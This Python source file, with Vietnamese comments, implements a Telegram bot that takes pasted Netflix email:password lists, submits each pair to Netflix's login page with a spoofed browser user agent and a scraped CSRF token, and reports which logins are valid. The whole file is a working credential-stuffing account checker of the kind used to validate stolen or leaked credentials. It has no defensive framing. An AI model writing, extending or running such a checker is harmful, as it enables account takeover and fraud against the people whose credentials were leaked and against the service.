import os
import re
import time
import logging
import asyncio
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Cấu hình logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', 
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================== CẤU HÌNH ==================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    logger.error("BOT_TOKEN chưa được đặt trong biến môi trường!")
    exit(1)

NETFLIX_LOGIN_URL = "https://www.netflix.com/vn/login"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# ================== HÀM KIỂM TRA BẰNG REQUESTS ==================
def check_with_requests(email: str, password: str) -> bool:
    """
    Thử đăng nhập bằng requests.
    Trả về True nếu đăng nhập thành công, False nếu thất bại hoặc cần fallback.
    """
    session = requests.Session()
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.netflix.com",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

    try:
        # 1. Lấy trang login để lấy CSRF token (nếu có)
        resp = session.get(NETFLIX_LOGIN_URL, headers=headers, timeout=10)
        if resp.status_code != 200:
            logger.warning(f"[Requests] Không thể truy cập trang login: {resp.status_code}")
            return False

        # Tìm token trong HTML (input hidden name="csrf_token")
        match = re.search(r'name="csrf_token"\s+value="([^"]+)"', resp.text)
        csrf_token = match.group(1) if match else ""

        # 2. Gửi POST đăng nhập
        login_payload = {
            "userLoginId": email,
            "password": password,
            "csrf_token": csrf_token,
            "rememberMe": "true",
            "flow": "websiteSignup",
            "mode": "login",
            "action": "loginAction",
        }
        login_resp = session.post(
            NETFLIX_LOGIN_URL,
            data=login_payload,
            headers=headers,
            timeout=10,
            allow_redirects=False
        )

        # Nếu server trả về 302 (redirect) -> có thể đăng nhập thành công
        if login_resp.status_code == 302 and "Set-Cookie" in login_resp.headers:
            # Thử truy cập trang browse để xác nhận
            browse_resp = session.get(
                "https://www.netflix.com/browse", 
                headers=headers, 
                timeout=10, 
                allow_redirects=False
            )
            if browse_resp.status_code == 200 and "browse" in browse_resp.url:
                logger.info(f"[Requests] Thành công: {email}")
                return True
        return False
    except Exception as e:
        logger.warning(f"[Requests] Lỗi: {e}")
        return False  # Fallback sang Selenium

# ================== HÀM KIỂM TRA TỔNG HỢP ==================
async def check_account(email: str, password: str) -> str:
    """
    Kiểm tra một tài khoản bằng requests.
    Trả về chuỗi kết quả.
    """
    logger.info(f"Đang kiểm tra: {email}")
    if check_with_requests(email, password):
        return f"✅ {email}:{password} | Hợp lệ"
    else:
        return f"❌ {email}:{password} | Không hợp lệ"

# ================== XỬ LÝ TELEGRAM BOT ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Chào bạn! Gửi mình danh sách tài khoản Netflix theo định dạng:\n"
        "email1:password1\nemail2:password2\n...\n"
        "Mình sẽ kiểm tra và báo kết quả."
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if not text:
        await update.message.reply_text("Vui lòng gửi danh sách tài khoản.")
        return

    lines = text.splitlines()
    accounts = []
    for line in lines:
        line = line.strip()
        if ':' in line:
            email, password = line.split(':', 1)
            accounts.append((email.strip(), password.strip()))
        else:
            await update.message.reply_text(f"Dòng không đúng định dạng (thiếu dấu :): {line}")

    if not accounts:
        await update.message.reply_text("Không tìm thấy tài khoản hợp lệ nào.")
        return

    await update.message.reply_text(f"🔍 Đang kiểm tra {len(accounts)} tài khoản, vui lòng đợi...")

    for email, password in accounts:
        result = await check_account(email, password)
        await update.message.reply_text(result)
        await asyncio.sleep(1)

    await update.message.reply_text(f"✅ Hoàn thành! Đã kiểm tra {len(accounts)} tài khoản.")

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    logger.info("Bot đang chạy...")
    application.run_polling()

if __name__ == "__main__":
    main()